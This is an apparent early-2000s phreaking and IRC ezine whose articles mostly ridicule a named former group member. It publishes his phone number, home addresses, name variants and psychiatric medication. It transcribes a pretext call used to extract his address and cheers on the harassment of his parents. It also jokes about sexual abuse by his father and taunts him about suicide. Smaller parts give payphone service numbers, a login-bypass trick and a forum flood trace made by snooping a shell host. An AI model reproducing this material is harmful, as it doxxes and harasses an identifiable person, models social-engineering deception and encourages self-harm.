.:::::. [01] Introduction ::::::::::::::::::::::::::::::::::::. [p4kp4kp4k]

Hi folks, Head Rush here. Well a lot's happened since last issue. First of all,
I've been kicked out of P4K. Yeppa that's right I've been kicked out of my
own group. You see, I cleverly made the focus point of the group an IRC server
whose inhabitants were reknowned for their hatred of phreaking so #p4k is
nowhere I can access it now. Slick move eh? However, although I'm not a member
I have still put together the next ezine for the group. See how nice I am?

AFAIK, before I was kicked to the curb, the group realised we actually knew
nothing whatsoever about phreaking so became more IRC and "hacking" (we aren't
really much in this department either) oriented and so we had to do away with
the original meaning of P4K. Fuck knows what it's called now, but some
suggestions are in section [14]. In keeping with this, this issue contains only
some phreaking articles, but mostly is in keeping with the group's current IRC
and "hacking" focus and were written by or about our (sorry I mean their) eleat
membership.

You might be wondering why, if I'm not a member, would I put together these
articles (mostly we just grabbed/plagiarised posts to web forums and from logs
we traded with other people) at all? The answer is we find them to be extremely
fun and amusing and laughter is good for the health. If you don't understand,
read the articles and it will somehow come to you. Also we wanted to provide an
accurate history of the group for the year after the first issue. Some of this
stuff is best read while referring to issue 1. Infact, this issue may be the
*only* decent reason to read issue 1 in the first place! :) I know we didn't
intend it, but exclude Phreakazoid's article from issue 1 and this issue
accidentally contains way more informative material.

Something you need to remember while reading this is that, although the authors
are often not who they say they are, the logs and events described herein _ARE_
_ALL_TRUE_. Upon reading certain things you may very well feel like asking "Is
that really what happened?!" Well, I don't know how to emphasise enough that
_YES_IT_IS_. The authors are not making them up to be funny, they're not
embellishing or exaggerating, _THESE_THINGS_*REALLY*_HAPPENED. The only
exception is article [9] by the fiction writer Michael Erbschloe which is still
*based* on true events. No-one could make the other things up.

Lastly, this ezine is interactive. Do not underestimate this. Want more
content? Go to irc.mutox.org or whatever address Cheeba is hiding his server on
by the time you read this and get some more. Send in amusing logs and we will
reply with our comments. Maybe we will put them in another whole issue
(actually there is a distinct lack of articles for us to er .. comment on, but
I have a strange feeling that somehow enough material will end up floating
around.) Also remember to send me things like their current IRC server
addresses so I can give them to the people that ask me for them.

In the meantime the list is in [14].

.::::::.[03] Getting Payphone Nos v2.0 (Errata) ::::::::::::::. [Zaleth]

1. "This file will show you various methods of obtaining a payphones
number. I know this tutorial has been done dozens of times but I want
to make this one easier and more informative than the rest :)"

  [ An error in itself... ]

2. "This has everything! When I mention a Gold Phone I will call it a GP
because Credit Phones and Gold Phones have the same cabinet numbers."

  [ No, they don't. This is actually a typo-graphical error from the APD
    web-site. There is no such thing as a C4 Creditphone. ]

3. Dorro [sic] Phone:

  [ Can't let a sic of identifying terminology pass. The correct spelling is
    printed on the facking phones after all... ]

4. Sound Recording

  [ he means RVA... ]

5. "So now we have found that the last two numbers of the payphone is [sic]:
79 making the number 9321 XX79 . Now here comes the time consuming
part, you will need to scan 99 numbers to find the payphone number its
recommended you do this from a payphone so you won't be found."

  [ Actually, 00 - 99 = 100 numbers... duh! ]

6. "When you [sic] trying to find the number listen either for the phone to 
ring, or on your phone it may be engaged or the phone may display
Service Unavailable [wrong]. I personally don't use this technique because its
a waste of time."

  [ "SERVICE NOT AVAILABLE"! ] 

7. "With this number you can also use, 001618129773868 or any other
international number which darkthief pointed out."

  [ 001600 is easier... ]

8. "4) Credit/Eftpos Phones
This technique was found by myself, a few people couldn't figure out
how to get a B2's phone number so I had to make my way to the airport
to figure her [!] out and this is what i came up with in 2mins.
1] Pick up the receiver.
2] Hold down SERVICE CALL button. 
3] Dial in the service number (e.g. DCX &/or FAST).
4] When asked for Authorisation hold down the SERVICE
CALL button and input what ever is necessary."

  [ This doesn't actually work. Zaleth is such a pretender. I extracted the
    numbers from a couple of B1s using my key-card long before his fantasies
    at the airport. ]

9. "You will hear "Welcome to the iPrimus DCX" blah blah blah."  [ so wrong ]

10. "(Ed: Since the Zaleth writing/submitting this article the Primus DCX has
been patched so the exploit of using ** to bypass the login doesn't work
anymore. So now you will haveto try to bruteforce the logon. These sort
of things happy [sic!] due to abuse and public posting of the details on such
areas as the AusPhreak BBS, where it is known to be monitored by Telcos
employees/pigs. So just be careful and wise what you post.)"

  [ Biatch! : 

    1) the individual guilty of reckless distribution of the Primus
    DCX number to every little fack-wit newbie was, incidentally, Zaleth.

    2) Another incidental fact : Around five months post the writing of that,
    "someone" decided to narc up a storm and dob in several AusPhreak BBS
    regulars to the "pigs". Was this individual the person behind littering
    the past issue of this ezine with spelling errors and self-serving, inane
    'Ed' notes and called Anomaly? Why yes it was. ]

11. "the name for a payphone phoneline is called "EQL"."  [ wrong again ]

12. Telstra ANI: 1800 801 920 <=- Found by me ;P  [ wrong ]

13. iPrimus DCX: 1800 855 747

  [ Actually the Primus Telecom "Kalamazoo" phonecard, unrelated to the
    Internet... ]

That's 13 simple errors in such an elementary subject like "getting payphone
numbers", and not at all the expected behaviour of an "elite" phreaker...


.:::::. [04] P4K Pop IQ Test :::::::::::::::::::::::::::::::::::::::.

  [ Note: This article has been published previously resulting in much angst
    for the subject. We republish it here for posterity. Anomaly has
    categorically denied that these events ever took place despite the posting
    of his full details as proof which only seemed to result in even more
    angst. Go figure. Also see article [5] for more information on this. ]

Special people, with special needs. Retards. Yep, the internet is full of em.
I have recently discovered that the sole worthwhile use of IRC, a medium that
is literally filled with such people, is to gain petty enjoyment from the
ridicule and abuse of the inhabitants, specifically the plethora of variably
impaired retards that feel the need to insinuate themselves into the these days
so-called "hacker scene". Today we'll be specifically examining the retard
specimen known as Teh Anomaly of P4K (Phreaking 4 Kids).

Initial Analysis
~~~~~~~~~~~~~~~~

"I've bin in the scene for 6 years!"

[ Translation : My parents thought I was self educating, but I was on IRC! The
  average IRC homo realises within 2 - 3 years that they have infact just
  wasted the last 2 - 3 years. We are dealing with an extra special case. ]

"I can't give you any infomation because I haven't dun anything .. yet;
 but I'm trying to find out more infomation so I can get more infomation"

[ Translation : I'm a useless lazy wankhead. I'm not a bad boy daddy! I'm not
  a bad boy! Please don't hurt me!! ]

"Whot have I dun? Oh the usual line hijack, tapping payphones to get
 Homelink PINs."

[ Translation : I realised my original approach doesn't work, please believe
  this one. Dressing up, and bullshitting about, beige boxing? Bullshitting
  about instead of brute forcing to get a PIN to a random number, using a more
  difficult and certainly more time consuming method to ... get a PIN to a
  random number?? ]

"I edited the p4k ezine withowt the knead for spelcheck!"

[ Translation : I introduced more errors than I fixed. (Check for yourself.)]

"I took over moderashon of the Ausphreak bored!"

[ Translation : I have no idea why posts dwindled to a stop and it was dos'ed
  and shut down within one week of me starting ... ]

"Your all dillushonal!!"

[ Translation : I forgot to mention I need to take drugs for my FACKED brain :

  [12:28] <anomaly> plus I was on depression medication
  [12:28] <anomaly> and a medical certificate
  [12:28] <Mortokan> what prozac?
  [12:28] <anomaly> nah
  [12:28] <anomaly> worse than prozac
  [12:28] <Mortokan> lithium?
  [12:28] <anomaly> ciprimol and aropax  <--- Hoh!!

  Claiming the rest of the world are the ones who are insane is a common ploy
  used by .. the insane. Doesn't seem to work too well, but that's not the
  point. There isn't one. ]

"YOU HAVE NO SOCIAL LIVE IF YOU DUN HANG AROWND ON IRC!!"

[ Translation : I have no social life or life of any other kind. Come to IRC
  and make fun of me. (This is my personal favourite.) ]

Where does it end?!? Constantly making fun of him on IRC is fine, but getting
more hands on is always a plus, so what do we do? We help them of course! We
take them under our wing and we teach them, we give them a ring and give them
an induction into the phreaking arts.


The Lecture (Induction into the art of phreaking 101)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I got his phone number from his mum. Very helpful lady, not only was she more
than happy to give me his phone number, she gave me his birthdate, middle names
and the name he had changed his name from as well (why someone as cool as
Anomaly would need to change his name is beyond me. Why would anyone want to
hurt him!). A bit disturbing though, I think she might have been flirting with
me!

 *****************************************************************************
 NOTE : ANOMALY LOVES TO NARC. DURING THE COURSE OF HIS IRC CAREER HE'S LOADED
 DOWN CRIMESTOPPERS SO BAD IT WOULD BE MORE COST EFFECTIVE TO JUST SET UP A
 DIRECT LINE TO HIS HOUSE. ANY TIME HE CAN FIND SOMETHING TO NARC FOR, HE
 LAUNCHES INTO A TADDLE TALE TERROR STRIKE.

 SO, IF YOU ARE READING THIS BECAUSE YOU ARE THE LATEST PERSON ANOMALY HAS
 RUN TO WITH HIS TALES NOTE THAT PERSONAL DETAILS HERE HAVE BEEN CHANGED WHEN
 NECESSARY TO PROTECT THE INNOCENT. NOTHING TO SEE HERE. MOVE ALONG.
 *****************************************************************************

I will be LECTURER in the following transcript of the conversation that
occurred. Yes, this is verbatim :

[ 08 8285 2174 ]

** RING RING **   ** RING RING **

ANOMALY : hello?

[ His voice fit the psychological profile I had derived. It was the monotone
  of a sub-human whose serotonin receptors have been fried from long periods
  of manic depression. The only spark a hint of confusion induced by a strange
  world that consistently behaves in a manner that (to him) is unexpected and
  ... anomalous. ]

LECTURER : Ahh yes hello, is this 14 Memorial Court, Kersbrook?

[ I tried my best to sound business like and suppress my laughter. I was at a
  payphone outside a pub in town with my beer resting on the phone. ]

ANOMALY : No, this is number 17.

LECTURER : Oh, 17 Memorial Court, Kersbrook?

ANOMALY : uhh 17 Balmoral Road, Salisbury.

[ Maybe right now you are thinking "no he couldn't be!" I actually expected
  this to work, considering the resistance, believe it or not. ]

LECTURER : Sorry, what was that again?

[ I could hardly facking hear because of poor SNR. I thought maybe his dad was
  laying in a few kidney punches while he was on the phone making his voice
  stutter, then I realised he moved out of home to avoid that and perhaps it was
  just the yobos at the pub making the noise. ]

ANOMALY : Well err who are you looking for?

[ Oooh he's getting suspicious! Duck and cover! ]

LECTURER : Wesley.

ANOMALY : uh well that's me, uhh

[ With one word much confusion is induced. ]

LECTURER : Could you just repeat what you said earlier, 17 ...

ANOMALY : 17 Balmoral Road, Salisbury. 14 Memorial Court is my parents' house.

[ Hee! Thanks dickhead. I spent a little time writing it down and swigging
  my beer. ]

LECTURER : Okay, so that's 17 Balmoral Road, Salisbury?

ANOMALY : Yes

[ So helpful, yet so stupid. I decided to rub it in a little. ]

LECTURER : Okay, well that's pretty much all the information I need.

ANOMALY : uh, well uh huh huh hoo is this?

LECTURER : *stifled chuckle* Bye.

< CLICK >

[ Obviously that's where the recording ends, so I have no knowledge of what
  occurred on his end of the line. On my end of the line I started laughing
  uncontrollably, but here is what I imagine occurred on his end : ]

ANOMALY : /kickban LECTURER 13/f/jap-LOLL!!!

ANOMALY : ...

ANOMALY : /kickban LECTURER 13/f/jap-LOLL!!!

ANOMALY : ...

[ He forgot it doesn't work in real life. ]

ANOMALY : *Mixed Emotions* I need to take some aropax!! :) :( :) :(

< END LOG >

So there you have it. SHIT. HEAD. I can't really claim any credit for this.
Anomaly is a retard that, in an attempt to escape from this reality, engages
in denial and takes drugs which inevitably lead to further retardation. Within
a few short seconds of speaking to him I virtually made him suck my cock
without him even knowing. I did not identify myself in any way. I did not
claim, much less prove that I had any legitimate need for the information I
received. The only suspicion that was encountered was brushed aside with a
single word. We hope you (and to a lesser extent, given the poor likelihood,
he) learned something from this lecture.


.:::::. [05] Paranoia & Being Paranoid Pt.2 ::::::::::::::::::. [head_rush]

Subtitle : Being Paranoid On-Line
Other Subtitle : P4K Pop IQ Test Part 2

:: What It Means

Well, I've already covered the definition of paranoia in the first article in
this series, so now I will define a more relevant term :

delusion
n.
1) False believe or impression with or without grandeur, often strenuously
defended with apparent logic and reason.
2) False hope.

delusional
adj.
1) Relating to, characteristic of, or affected with delusion.
n.
Anomaly.

:: Paranoia in Hacking / On-line.

In this article, we will be covering paranoia in hacking, that is making sure
you aren't caught doing your little skript kiddie activities. We will present
this by looking at a case study of how a bottom-of-the-rung lamer would
approach hacking and thus how he would be caught. Oh yeah, lame as this seems
it is a true story. The logs are real. The skript kiddies are lame. The end to
their fantasy worlds are final.

One thing in the logs is that the login name of the tracker was 'analomy'(HEH).
In the logs below, this has been changed to 'tracker' to avoid confusion.

:: Background.

July 2003 the Onecenter forum, the Ausphreak BBS was revived. It had previously
been shut down due to Anomaly becoming the moderator, getting his arse DOSed
and then, in a tantrum, refusing to allow any further posts to the board. It
would appear that someone reregistered the board. It should be noted that noone
really cared when it was DOSed prior to this because with Anomaly as the
admin it had well progressed in its descent into the toilet within the week it
took for someone to just say "ah fuck it".

Anomaly reared his asinine head on the board in August some time and was
promptly faced with article [4] in this ezine and a statement along the lines
of "a fool's opinion isn't really worth too much buckaroo." Of course, being
unable to handle reality in many capacities, Anomaly's initial reaction was to
promptly and inanely disavow all the events described in general. That is to
say, being specific may have slipped him up. Unluckily for him and despite his
knowledge that it existed; someone, labelling him with the moniker of 'The P4K
Information Minister', posted a link to a usenet conversation where someone
else had posted Anomaly's details to prove the events described took place.
Things don't work out for Anomaly very often.

:: The Flood Attack

His need to retreat from reality unfulfilled Anomaly formulated a strategy for
redeeming himself. Seeing as how so many people had mocked him for getting
the board flooded around 8 months prior, Anomaly decided he would do the exact
same thing to the board now, overlooking the fact that people might actually
care this time, seeing as the board wasn't moderated by him (it wasn't
actually moderated by anyone and was going a damn sight better than in the
week it took for him to run it into the compost heap). The board was flooded
with the message "Some People Never Learn" (as we'll see this is ironic) and
people were pissed off. Anomaly, high on his new found ego boost, stated some
inane garbage about how "whoever did it took action to defend themselves". I
imagine he went off and masturbated after that, a carrot well up his arse.

Problem was Anomaly had already been traced all the way back to his ISP during
his little flooding and was about to be unmasked and his fantasy world
shattered into even tinier pieces than before.

:: The Trace

As you can imagine, this was pretty easy. For starters, the attack depended on
a newline character being posted in the subject line of a post. As you will
see from the fucked as flood script that was nicked from him he inadvertently
stumbled across this. If his script had worked as he intended his attack
probably wouldn't even have worked. Well, even luck can't save someone like
weasly (a nick given to him after he was proved the flooder). An effect of this
attack is that the last flood post looks like this (this is an actual example
from his flood) :

29. 1060668002 - 216.93.104.34, 216.93.104.34, Thu, Jan 1 1970 at 10:00 am [
hits, b] --- This from ausphreak board.

Looks like an IP address there to me. Follow that address to :

http://216.93.104.34

and you get "Grex Internet Services" webpage. A free shell provider. In his
"wisdom" Anomaly has decided to bounce through another host to perform the
attack.

[IDIOCY 1] : DO NOT USE A PUBLIC SHELL PROVIDER TO BOUNCE ATTACKS YOU ASSHOLE.

Maybe a proxy server or a hacked host would have been acceptable, but a host
any fucken tom, dick and harry can get a shell on is basically transparent. As
it happens, this is just what occurred :

$ hostname
grex.cyberspace.org

What couldn't have been done to a proxy? A process listing gotten. That's what
happened here and the tracker noticed an interesting process name :

$ ps aux | grep ausphreak
surecom2 10544 0.0 0.8 1232 2040 q1 S 01:49 0:05 perl ausphreak.pl
tracker 10867 0.0 0.1 80 332 sb S 01:52 0:00 grep ausphreak
surecom2 10568 0.0 0.8 1232 2040 q1 S 01:49 0:05 perl ausphreak.pl
surecom2 10607 0.0 0.8 1232 2052 q1 S 01:49 0:03 perl ausphreak.pl

[IDIOCY 2] : DO NOT CALL YOUR FLOOD TOOL SOMETHING FUCKING OBVIOUS YOU MORON.

There are heaps of processes on these free shell providers at any given time
and if it was something inconspicuous a connection never would have been made.
As we know, a decision made by Anomaly is a bad decision.

$ who | grep surecom2
surecom2 ttys9 Aug 12 01:52 (211.29.160.145)

OH DEAR! WHAT'S THAT? IS THAT AN ORIGINATING IP? LOOKS LIKE IT.

We'll come back to this later, but right now, we can see that Anomaly's
"impenetrable safety measure" has been cut through like his arse by his
father's cock.

But have we finished with Anomaly's mistakes on this host? Not by a long shot.
The tracker decided to see if he could check out "surecom2"s home directory :

$ pwd
/a/s/u/surecom2
$ ls
pico testsock.pl

[IDIOCY 3] : TRY CHMODDING YOUR HOME DIRECTORY SO ITS NOT WORLD READABLE,
FUCKWIT.

By this time he seemed to have erased ausphreak.pl, but there's a testsock.pl
there, what's that eh? Does Anomaly even know how to USE chmod? Let's check :

$ more testsock.pl
#!/usr/bin/perl

[IDIOCY 4] : LEARN TO USE BASIC TOOLS LIKE CHMOD SO PEOPLE CAN'T READ YOUR
FILES RETARD.

Note that there's his forum account's password in there as well. It can't be
changed so it's not something you want known. Also he's fucked the sleep()
time. Onecenter forums have a throttle of something like two posts every
45 seconds. This is probably why, earlier on he had to keep restarting his
stupid script because his DOS attacks would keep triggering the throttle.

Is he using this script? :

$ ps aux | grep testsock
tracker 12989 15.4 0.1 80 332 sb S 02:06 0:00 grep testsock
surecom2 12844 0.0 0.8 1224 2036 p8 S 02:05 0:02 perl testsock.pl

Yep. Also check how he's executing it, with perl infront.

[IDIOCY 5] IF YOU KNEW HOW TO USE CHMOD YOU COULD +x YOUR SCRIPT KNOBHEAD.

Afew more checks :

$ who | grep surecom2
surecom2 ttys9 Aug 12 01:52 (211.29.160.145)
$ ps aux | grep surecom2
tracker 13376 7.9 0.1 80 332 sb S 02:09 0:00 grep surecom2

surecom2 12842 0.0 0.0 28 0 p8 IW 02:05 0:00 sh pico

OK, now we can see that the idiot can't use vi and has to use fucking pico.

[IDIOCY 6] : YOU PICO SPASTIC I'D KICK YOU OFF THE SERVER FOR THIS.

Later on, the tracker came back to do a full directory listing and makes a
discovery :

$ ls -al

What's that text file there, with correct permissions? Have the admins
noticed Anomaly's activites as well and left him a note?

[IDIOCY 7] : IF YOU ARE GOING TO USE A FREE SHELL, MAKE SURE THE ADMINS DON'T
NOTICE YOUR IDIOT ACTIVITIES, IDIOT.

A traceroute on the IP shows it inside the Optus network in Sydney, but more
revealing is what happens when you connect to the IRC port :

[IDIOCY (WHAT ARE WE ON NOW?) *8* ] : DON'T DO YOUR HACKING FROM YOUR SOGGY SAO
CIRCLE OF FRIEND'S IRC SERVER, TOOL. ALSO DON'T SUCCUMB TO WEAKNESS AND/OR
FOOLISHNESS (HARD FOR YOU I KNOW) AND LET ANOMALY DO HIS HACKING FROM YOUR
SOGGY SAO CIRCLE IRC SERVER, CHEEBA.

And for our finale, let's do a whois :

anomaly is ~bob@host-1EDB1E83.lns1.adl2.internode.on.net * beer
anomaly is a registered nick
anomaly on @#ugli @#p4k-ssl @#wireless @#p4k
anomaly using irc.mutox.org mutox.org IRC Server
anomaly is a Secure Connection
anomaly End of /WHOIS list.

And look at that. A full trace back to his ISP. That's 8 really stupid
mistakes we've documented here. Anomaly had to be pretty fucking retarded to
get traced doing something as elementary as flooding a web forum.

:: The Aftermath

Right now you must be thinking something like "fuck, if I found out I was that
lame I'd be off to the back room to quaff down around 300 aropax tablets and
say ta ta to the cruel world", but what does Anomaly do? HE ACTUALLY DENIES HE
HAD ANYTHING TO DO WITH IT!!!! That's right, the above is pretty damned
conclusive and we're not even including the slipups he made like being the one
who said the flooders were defending themselves when he was the disgruntled
individual (he started it all btw). Infact, if that's not bad enough, after
there were enough posts to put the flood on the second page of the forum, HE
DENIED THE FLOOD EVEN HAPPENED!!!!!!!! All I can say is that he's going to be
known as the P4K Information Minister for the rest of his years (anyone
remember the iraqi information minister? Similarities obviously came to mind
for someone).

The Ausphreak board has now moved and the Ausphreak board we are talking about
here basically became a forum for people to abuse Anomaly and for Anomaly to
write homosexual love notes to himself on. Seeing as Anomaly had put himself
on the wrong side of everyone there was quite a bit of support for the en masse
sending of catalogues to his parent's house to names like "Wesley Luesa, Wesley
Lusa, Wesley Looser and Wesley Losser" that seemed to have then occurred. Hmm
also someone rang up his dad at work telling them they were from Optusnet and
his son was going to get busted for flooding (incidentally his dad practically
insisted Anomaly be sent to jail immediately). Other things may have happened
that I don't know about or can't remember.

This would be the *third* time Anomaly has been publicly and badly outsmarted.
2nd time [4], 1st time [6]. It's as Arthur Conan Doyle's Dr Watson said :

Something happens once  : It is an occurrence.
Something happens twice : It is a coincidence.
Something happens THREE TIMES : There is a pattern.

.: Outtro :.

Well now we have come to the end. Looking back on these events, they are a lot
more lame than I remembered. Anomaly, I know you hate yourself and are worried
that your life may be becoming too long, but we all know you have nowhere near
the competence (not to mention the balls) required to actually top yourself. To
everyone else, remember that I, head_rush, cry if I am abused and I was five
minutes late for dinner because I wrote this and my mum smacked me so don't
knock it please. If you are not Anomaly this article probably won't help you
stay safe because you aren't lame enough to fuck up this bad. If you are well,
you are on your own, you'll probably make these exact mistakes again many times
(SOME PEOPLE NEVER LEARN). Later people.


.:::::. [06] A Day In #p4k  ::::::::::::::::::::::::::::::::::. [Willy C]

Greetings Gentlemen. William Cilldhaire here, that is Anomaly's father. Here
are the results of my investigation into my loser son's online life (his life).
You see, I am paying for the little fuckwit's internet connection and I wanted
to see what he was doing with it, seeing as he continually fails so badly at
university. I originally intended to go in there and tell him to get the fuck
off IRC and do something productive, but an opportunity presented itself and
unlike my son, I don't pass up opportunities :

[12:16] *** Now talking in #p4k
[12:16] *** Topic is 'www.ruxcon.org <-- P4K meet there, if we can get enough

[12:17] <Mortokan> how are you?
[12:17] <anomaly> I'm ok
[12:17] <Mortokan> whats this ruxcon thingo?
[12:17] <cheeba> its a gay seex convention

  [ Well that's a black mark next to one of Anomaly's friends. Check the box
    next to anti-social and disliked by his superiors. ]

[12:18] <anomaly> if you don't know, it prolly means you wouldn't want to go
[12:18] <anomaly> it's for lame crews to reprhazent their states
[12:18] <Mortokan> are you reprhazenting?
[12:18] <anomaly> if I find my AK, sure
[12:19] <anomaly> and my ice cube cd's

  [ He mentioned to me that he was having trouble with someone from Perth. It
    seems he was afraid of meeting this fellow there (if I were as skinny as
    young weasly, I would be too). ]

[12:19] <Mortokan> so whats going on?
[12:19] <crisis`work> <anomaly> it's for lame crews to reprhazent their states
<--- ROFLMAO

  [ Black mark next to this other friend of his, not to mention him. ]

[12:20] <cheeba> sorry
[12:20] <cheeba> "0-day"
[12:20] <Mortokan> you don't get into the 0-day?
[12:21] <cheeba> no
[12:21] <cheeba> 0-day is bullshit
[12:21] <Mortokan> how come?
[12:21] <Carkus> whois Mortokan ?
[12:21] <anomaly> lol
[12:21] <anomaly> 0-day is so old..

  [ If my dickhead son is laughing at him, he must be an idiot. Just who is

[12:21] <Carkus> oh.. haha
[12:21] <Mortokan> hey carkus
[12:21] <cheeba> pls provide a definition
[12:21] <cheeba> cos i dont know
[12:22] <cheeba> sure, its "unreleased" exploits
[12:22] <Carkus> yo Mortokan
[12:22] <Mortokan> cheeba : but ...

  [ Cheeba wants be owned with 0-day. ]

[12:23] <Mortokan> anomaly : which uni did you go to?
[12:24] <anomaly> Mortokan: unisa
[12:24] <Mortokan> ah ok
[12:24] <Mortokan> did you do honours in comp sci?
[12:24] <anomaly> heh
[12:24] <anomaly> um
[12:24] <anomaly> I'll give you a little hint
[12:24] <Mortokan> or just bachelor?
[12:24] <Carkus> lol
[12:24] <anomaly> I'm enrolling for semester 1 this week
[12:24] <Mortokan> hahaha

  [ Why am I laughing? ]

[12:24] <Mortokan> so you didn't take to the java?
[12:25] <anomaly> bachelor's, and I plan to complete the honours requirements
[12:25] <anomaly> i did
[12:25] <anomaly> i had to defer before the semester finished
[12:25] <Mortokan> how come?
[12:25] <anomaly> so I didn't get credit for it
[12:25] <Mortokan> :/
[12:25] <anomaly> financial reasons, home reasons, and legal reasons
[12:25] <Mortokan> legal reasons?
[12:25] <anomaly> don't ask
[12:25] <Mortokan> ok hehehe
[12:26] <Mortokan> you moved out of the parents place hey?
[12:26] <Mortokan> cutting the umbilical cord
[12:26] <anomaly> nope
[12:26] <anomaly> not quite either
[12:26] <Mortokan> you just moved house?
[12:27] <anomaly> no
[12:27] <anomaly> I lost my job
[12:27] <anomaly> had to move back home
[12:27] <Mortokan> no shit
[12:27] <anomaly> had a disagreement with the old man

  [ I kicked his useless arse, then found a use for it and fucked it. ]

[12:27] <anomaly> so I smashed up his 4x4, and got kicked out/left

  [ He girl slapped it in a tantrum, then kept running after I chased him. ]

[12:27] <anomaly> went awol for a few months
[12:28] <anomaly> plus I was on depression medication
[12:28] <anomaly> and a medical certificate

  [ Medical certificate for mental health problems? CERTIFIED INSANE. Awol due
    to those self-same problems? IN A MENTAL INSTITUTION. ]

[12:28] <Mortokan> what prozac?
[12:28] <anomaly> nah
[12:28] <anomaly> worse than prozac
[12:28] <Mortokan> lithium?
[12:28] <anomaly> ciprimol and aropax
[12:28] <Mortokan> ah ok
[12:28] <anomaly> lithium, lol
[12:28] <anomaly> I wish

  [ So do I. ]

[12:28] <Mortokan> hehe :p

  [ Why am I laughing? ]

[12:28] <anomaly> the shit they had me on increased anxiety like 500%

  [ Actually serotonin re-uptake inhibitors are designed to stabilise the
    chemical imbalance that causes things like anxiety. The true cause of the
    anxiety would really be something like 1) wisely taking large amounts of
    some narcotic like marajuana with his medication, thereby fucking up his
    brain even worse; or 2) me. ]

[12:29] <anomaly> kinda the reason I went awol
[12:29] <anomaly> but, all behind me now

  [ Check again. I should know, I'm right here too. ]

[12:29] <anomaly> and dad knows what I think of him
[12:29] <anomaly> it's all good
[12:29] <Mortokan> so you are cool with your dad now?
[12:29] <Mortokan> living back at home?
[12:29] <anomaly> we 'get along'
[12:29] <anomaly> but he knows I think his opinion isn't worth the paper I wipe
my arse with

  [ Funny because his opinion isn't worth the cock I fuck his arse with. ]

[12:29] <anomaly> so he doesn't try to tell me what to do
[12:30] <Mortokan> I see
[12:30] <anomaly> guess the 4x4 kinda cost him too much, and he realised it was
cheaper for him to leave me alone ;)

  [ "No daddy leave me alone!!" He probably thinks that seeing as I haven't
    molested him since last night. ]

[12:30] <Mortokan> do you get along with your mum?
[12:30] <anomaly> heh yeah
[12:30] <anomaly> but why all the personal questions?
[12:31] <Carkus> he's profiling you by the looks =)
[12:31] <Mortokan> haha
[12:31] <Mortokan> nah just making convo
[12:31] <anomaly> i reckon
[12:31] <anomaly> carkus: ever see that online personality profiler?
[12:31] <Mortokan> still going to the 2600 meets?
[12:31] <Carkus> anomaly: nar
[12:32] <anomaly> apperantly I'm schitzophrenic, anti-social, untrustowrthy,
homicidal, suicidal, and most likely to abuse my children....
[12:32] <Carkus> i recall there being a muppets one tho.. if thats the one
[12:32] <anomaly> like, BS all round

  [ "I'm not a bad boy daddy!!" ]

[12:32] <Carkus> haha
[12:32] <anomaly> basically, the test result said "seek professional help
immediately", and this was AFTER the professional help.. lol
[12:32] <Carkus> lol

  [ Its called *further* professional help. ]

[12:33] <anomaly> jk, I'm not crazy, really
[12:33] <anomaly> and I didn't see things
[12:33] <Mortokan> hah I had to go to a psychiatrist once
[12:33] <Mortokan> they ask all these stupid questions
[12:33] <anomaly> those people were really there talking to me that night...
[12:34] <Mortokan> like "is the light hurting your eyes?"
[12:34] <anomaly> the neighbours even said they heard more than one voice
[12:34] <Mortokan> "how are you feeling?"
[12:34] <anomaly> "what goes through your min dwhen I say the word 'cow'?"
[12:34] <anomaly> "SEX"
[12:34] <Mortokan> haha is that what you said?
[12:34] <anomaly> "ok, and what if I say the word 'pencil'?"
[12:34] <anomaly> "SEX"

  [ Cow and pencil eh? What if I say 'fat daddy'? ]

[12:34] <Mortokan> they did word association on you?
[12:34] <anomaly> "ok, you're healthy, here's your certificate"
[12:35] <anomaly> Mortokan: lol, nar
[12:35] <anomaly> nothing like that
[12:35] <Mortokan> what did they do?
[12:35] <anomaly> 'professional help' == my GP writing me a prescription for
that aropax shit

  [ HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAAHAHAHAHAHAHA ]

[12:35] <Mortokan> ah
[12:35] <anomaly> so
[12:35] <anomaly> whats YOUR story now?
[12:35] <Mortokan> hehe about what?
[12:35] <anomaly> get along with the old folks alright?
[12:35] <Mortokan> yeah I dominate them
[12:36] <Mortokan> and they are cool with that
[12:36] <anomaly> ever have thoughts of sneeking into their bedroom at night
and smothering one of them with a pillow?
[12:36] <Mortokan> yeah of my father
[12:36] <Mortokan> and then shagging my mother
[12:36] <Mortokan> haha
[12:36] <Mortokan> j/k LOL

  [ Why am I laughing? ]

[12:36] <anomaly> thats alright
[12:36] <anomaly> dr frued wanted the same thing
[12:36] <anomaly> he <3 his mum long time

  [ Freudian projection defense mechanism at work. IT APPLIES TO YOU MMKAY?? ]

[12:37] <Mortokan> ok I better go do some werk
[12:37] <anomaly> pff
[12:37] <Mortokan> I might catchya later
[12:37] <anomaly> that'd be right
[12:37] <Mortokan> :P
[12:37] <anomaly> you'd better
[12:37] <anomaly> I'm not finished profiling you yet

  [ Ah yes (tm) stupidity. ]

[12:37] <Carkus> what work ya do Mortokan ?
[12:37] *** Disconnected

  [ Stifled Chuckle. Bye. ]

Am I supposed to write an outtro here? The investigation's results speak for
themself. Also I'm too busy emailing Anomaly to tell him he'd better buy some
lube.


.:::::. [07] irc.mutox.org emulation :::::::::::::::::::::::::. [anom n cheeb]

:: Intro - by Anomaly's Psychiatrist

Allow me to introduce you to an important IRC technique. Infact, this
describes the core principle of certain IRC conversations. If you are anything
like the guys we got this info off, anom n cheeb from the block .. uh I mean
from irc.mutox.org, you aren't the brightest crayon in the pack and you are
constantly getting made fun of by people. Winning some flame war you start on
IRC isn't a possibility, but what about perhaps preserving a little dignity, if
at least from your perspective only? Very important to maintaining an all
important fantasy world (especially if it's the only thing keeping you from
suicide). Now I know I'm writing the intro here, but we gave credit to the
people we interviewed, because in the last issue of this ezine P4K got in a bit
of strife due to some crap about if they copy the material from someone else
and put their name at the top it is 'plagiarism' or something like that.


:: What Cheeba Says

whell first thinge u hav 2 rememba 2 preserv sum dignity iz taht u dun really
understande a lot and so use taht. if sum1 abuses u, just beilive u dun
get wot thay r sayinge. these haz de aded advantage ov makeing them hav 2
articulate wot thay meen. in teh unliekely incident thay cunt doo these then
U GOTT THEM!! aslo it can maik u thinke taht u dun get tawlked 2 liek
these alott cuz ov ur eleatness. easy way 2 do these is sumthinge liek these :

<abuser> you can't handle it can you
<abuser> weak bastard
<cheeba`work> handle it ?    <--- hehe u dun understande
<abuser> there we go
<cheeba`work> what is it ?   <--- nowe thay muste explain!! ;)

alternatively if u acte liek u nevar gett talked 2 liek taht and wot thay
abused u 4 is totaly ridiculus, no matter what, thenn u can thinke thay r
